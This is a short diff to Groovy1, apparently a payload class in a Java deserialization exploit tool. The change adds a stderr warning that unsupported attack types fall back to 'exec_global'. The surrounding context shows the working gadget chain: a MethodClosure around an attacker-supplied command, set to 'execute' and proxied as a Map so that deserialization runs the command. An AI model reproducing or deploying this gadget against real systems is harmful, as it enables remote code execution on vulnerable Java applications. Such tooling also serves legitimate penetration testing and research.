@@ -34,6 +34,16 @@ public class Groovy1 extends PayloadRunner implements ObjectPayload<InvocationHa
 	// federicodotta - not supported	
 
 	public InvocationHandler getObject(final String command, String attackType) throws Exception {
+		
+		if(!attackType.equals("exec_global")) {
+	    	
+	    	System.err.println("**********************************");
+	    	System.err.println(attackType + " not supported. Defaulting to exec_global");
+	    	System.err.println("**********************************");
+	    	System.err.println();
+	    	
+	    }
+		
 		final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(command, "execute"), "entrySet");
 
 		final Map map = Gadgets.createProxy(closure, Map.class);
